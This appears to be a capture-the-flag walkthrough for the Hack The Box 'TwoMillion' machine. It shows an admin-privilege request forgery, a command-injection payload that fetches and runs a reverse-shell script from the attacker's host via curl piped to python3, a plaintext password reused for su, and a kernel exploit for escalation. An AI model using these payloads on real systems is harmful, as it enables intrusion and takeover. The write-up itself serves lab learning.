---
authors:
    - Jiri Raja
date: 08-10-2025
---
# TwoMillion
Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -sV -v twomillion.htb
```

Visit the website and try to join the HTB.

enter the developer console (F12).
Copy the invite js file content into beutiful-js

You will get some methods, we can call in the console `makeInviteCode()` decode it using ROT13 using [cyberchef](https://cyberchef.org/).

It tells us to use an api endpoint.

```javascript
fetch('http://2million.htb/api/v1/invite/generate', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({})
})
   .then(response => response.json())
   .then(response => console.log(JSON.stringify(response)))
```

this gives us an encoded key. To decipher it, use the [cyberchef](https://cyberchef.org/) again.

Enter the code and register.

## www-data
Check http://2million.htb/home/access.

Some urls point us to the existence of `/api` endpoints.

First, we care about the `/api/v1/user/auth` which tells us email and `is_admin` parameter.
Then, we go to `/api/v1/admin/settings/update` and using burp we change the `content-type` to `json` and add `email`, `is_admin` fields.
This will give us admin rights.
```text
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7h389ria8it10flg3gjd950msb
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 43

{
  "email":"sad@sad.sad",
  "is_admin": 1
}

```

Finally, we go to `/api/v1/admin/vpn/generate` which uses our username in a shell command, so we tamper with it to create a reverse shell:
```text
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7h389ria8it10flg3gjd950msb
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 70

{"username":";curl 10.10.14.76:8000/tcp_pty_backconnect.py | python3"}
```

## User
Check the `Database.php` -> check `index.php` which loads the env variables from `.env` file.

```shell
cat .env
```

??? password

    SuperDuperPass123

It is unnecessary to check the database, since if we check the `/etc/passwd` file, we can see that the user `admin` exists.

We can test the password we found and the username `admin`:

```shell
su admin
```

Get the user hash.

## Root
Download linpeas (using python http server).
Check the emails section -> `/var/mail/admin` and read the email.

Check for the currect CVE's of the OverlayFS / FUSE (CVE-2023-0386). We will find on some random website ([here](https://securityonline.info/poc-exploit-released-for-linux-kernel-privilege-escalation-cve-2023-0386-bug/)) a link to a [PoC repo](https://github.com/xkaneiki/CVE-2023-0386).

Download the repo in zip to the victim, unzip it, and follow the instructions in the readme (translate them or just execute the last two commands in two separate windows/shells).

Get the root flag.
